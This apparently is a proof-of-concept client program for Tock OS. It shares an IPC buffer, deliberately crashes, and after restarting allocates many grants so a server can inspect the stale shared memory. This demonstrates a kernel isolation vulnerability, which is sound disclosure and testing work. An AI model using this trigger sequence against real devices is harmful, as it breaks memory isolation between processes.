#include <stdbool.h>
#include <stdio.h>
#include <string.h>

#include <libtock-sync/services/alarm.h>
#include <libtock/interface/button.h>
#include <libtock/kernel/ipc.h>
#include <libtock/tock.h>

// Buffer size and global variables
#define BUFFER_SIZE 128

// Static buffer - place it at a high memory address to make vulnerability more
// likely
static char shared_buffer[BUFFER_SIZE] __attribute__((section(".data")));
static size_t server_svc = 0;

// Global flags
static bool button_pressed = false;
static int pressed_button = 0;
static volatile int restart_count = 0;

// Fill buffer with recognizable pattern
static void initialize_buffer(void) {
  printf("Client: Initializing buffer at %p with size %d\n", shared_buffer,
         BUFFER_SIZE);

  // Clear buffer
  memset(shared_buffer, 0, BUFFER_SIZE);

  // Fill with recognizable pattern
  for (int i = 1; i < BUFFER_SIZE - 12; i += 12) {
    memcpy(&shared_buffer[i], "CLIENT-DATA", 11);
  }

  // First byte is reserved for command
  shared_buffer[0] = 0;

  printf("Client: Buffer initialized\n");
}

// Callback from server
static void server_callback(int pid, int len, int arg2, void *ud) {
  printf("Client: Received callback from server (pid=%d, len=%d)\n", pid, len);
}

// Button callback
static void button_callback(returncode_t ret, int num, bool val) {
  if (val) { // Button pressed
    printf("Client: Button %d pressed\n", num);
    pressed_button = num;
    button_pressed = true;
  }
}

// Allocate many grants to trigger vulnerability
static void allocate_many_grants(void) {
  printf("Client: Allocating many grants to trigger vulnerability...\n");

  // Register callbacks with many different drivers to force grant allocations
  for (int i = 0; i < 20; i++) {
    printf("Client: Allocating grant %d\n", i);
    ipc_register_client_callback(i + 100, server_callback, NULL);
  }

  printf("Client: Finished allocating grants\n");
}

// Function to trigger a crash
static void trigger_crash(void) {
  printf("Client: Triggering deliberate crash...\n");
  printf(
      "Client: After restart, will allocate grants to trigger vulnerability\n");

  // Cause division by zero to crash
  volatile int x = 1;
  volatile int y = 0;
  volatile int z = x / y; // This will crash

  // This should never execute
  printf("Client: This line should never print (z=%d)\n", z);
}

int main(void) {
  printf("\nVulnerability Demo Client starting (Restart count: %d)\n",
         restart_count);
  restart_count++; // Will reset if process crashes

  // Initialize buffer
  initialize_buffer();

  // Setup buttons
  printf("Client: Setting up button handlers\n");
  libtock_button_notify_on_press(0, button_callback);
  libtock_button_notify_on_press(1, button_callback);

  // Discover server service
  printf("Client: Looking for server service...\n");

  int retry = 0;
  int err = -1;
  while (err < 0 && retry < 10) {
    err = ipc_discover("server", &server_svc);
    if (err < 0) {
      printf("Client: Retry %d - server not found\n", retry);
      libtocksync_alarm_delay_ms(500); // Longer delay
      retry++;
    }
  }

  if (err < 0) {
    printf("Client: Failed to find server service\n");
    return -1;
  }

  printf("Client: Found server at service %d\n", server_svc);

  // Register for callbacks from server
  printf("Client: Registering for server callbacks\n");
  ipc_register_client_callback(server_svc, server_callback, NULL);

  // Share buffer with server
  printf("Client: Sharing buffer at %p with server\n", shared_buffer);
  err = ipc_share(server_svc, shared_buffer, BUFFER_SIZE);

  if (err < 0) {
    printf("Client: Failed to share buffer with server\n");
    return -1;
  }

  printf("Client: Buffer shared successfully\n");

  // Register buffer with server (command 0)
  printf("Client: Sending buffer registration command to server\n");
  shared_buffer[0] = 0;
  err = ipc_notify_service(server_svc);

  if (err < 0) {
    printf("Client: Failed to notify server\n");
  } else {
    printf("Client: Server notified successfully\n");
  }

  printf("Client: Setup complete\n");

  // If this is a restart, allocate grants and test vulnerability
  if (restart_count > 1) {
    printf("Client: Process has been restarted!\n");
    printf("Client: Waiting to ensure server is ready...\n");
    libtocksync_alarm_delay_ms(1000);

    allocate_many_grants();

    // Tell server to examine buffer after allocation
    printf("Client: Requesting server to examine buffer after restart\n");
    shared_buffer[0] = 1; // Command 1: Examine buffer
    err = ipc_notify_service(server_svc);

    if (err < 0) {
      printf("Client: Failed to notify server for examination\n");
    } else {
      printf("Client: Server notified for examination\n");
    }
  }

  printf("Client: Entering main loop (Press buttons to interact)\n");
  printf("  Button 0: Tell server to examine buffer\n");
  printf("  Button 1: Trigger crash/restart\n");

  // Main loop
  while (1) {
    // Wait for button press
    button_pressed = false;
    yield_for(&button_pressed);

    if (pressed_button == 0) {
      // Button 0: Request buffer examination
      printf("Client: Button 0 pressed - requesting buffer examination\n");
      shared_buffer[0] = 1; // Command 1: Examine buffer
      err = ipc_notify_service(server_svc);

      if (err < 0) {
        printf("Client: Failed to notify server\n");
      } else {
        printf("Client: Server notified successfully\n");
      }
    } else if (pressed_button == 1) {
      // Button 1: Trigger crash
      printf("Client: Button 1 pressed - triggering crash\n");
      trigger_crash();
    }

    // Add delay
    libtocksync_alarm_delay_ms(200);
  }

  return 0;
}
